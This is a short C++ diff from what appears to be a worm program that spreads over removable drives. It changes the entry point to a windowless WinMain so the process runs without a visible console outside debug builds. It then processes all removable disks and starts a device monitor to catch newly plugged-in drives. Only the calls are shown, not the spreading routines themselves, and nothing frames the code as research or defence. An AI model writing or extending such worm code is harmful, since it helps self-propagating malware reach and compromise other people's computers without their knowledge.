@@ -2,10 +2,16 @@
 
 
 
-int main() {
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
+{
+#ifdef _DEBUG
+	attach_console();
+#endif
+
 	
 	setlocale(LC_ALL, "Russian");
 	worm worm1;
+	worm::instance =&worm1;
 	//worm worm1("E:\\test_worm", 1);
 	worm1.worm_was_started();
 
@@ -19,6 +25,7 @@ int main() {
 
 	worm1.process_all_removable_disks();
 
+	return worm1.run_device_monitor(hInstance);
 
 	//worm1.scan_all_volumes();
 
